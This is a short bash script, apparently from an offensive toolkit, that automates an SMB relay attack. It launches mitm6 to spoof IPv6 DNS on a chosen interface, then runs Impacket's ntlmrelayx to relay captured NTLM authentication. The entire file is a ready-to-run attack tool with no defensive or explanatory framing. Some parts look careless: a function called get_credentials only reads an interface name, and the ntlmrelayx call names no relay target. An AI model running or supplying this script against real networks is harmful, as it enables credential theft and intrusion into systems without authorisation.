#!/usr/bin/env bash
# smb_relay.sh
# 11. SMB Relay Automation
# Launches mitm6 for IPv6 DNS spoofing and ntlmrelayx for SMB relay attacks.
# Usage: ./smb_relay.sh
# Requires: mitm6, ntlmrelayx.py (Impacket)

function detect_os() {
  case "$(uname -s)" in
    Linux*) echo "linux" ;;
    Darwin*) echo "darwin" ;;
    *) echo "unknown" ;;
  esac
}

function ensure_tool() {
  local t=$1
  if ! command -v "$t" &>/dev/null; then
    echo "[!] Please install $t manually"; exit 1
  fi
}

function get_credentials() {
  read -rp "Enter network interface: " IFACE
}

ensure_tool mitm6
ensure_tool ntlmrelayx.py
get_credentials

# Start IPv6 DNS spoof
echo "Starting mitm6 on interface ${IFACE}..."
mitm6 --interface ${IFACE} &

# Start SMB relay
echo "Starting ntlmrelayx for SMB relay..."
ntlmrelayx.py -smb2support -interface ${IFACE}
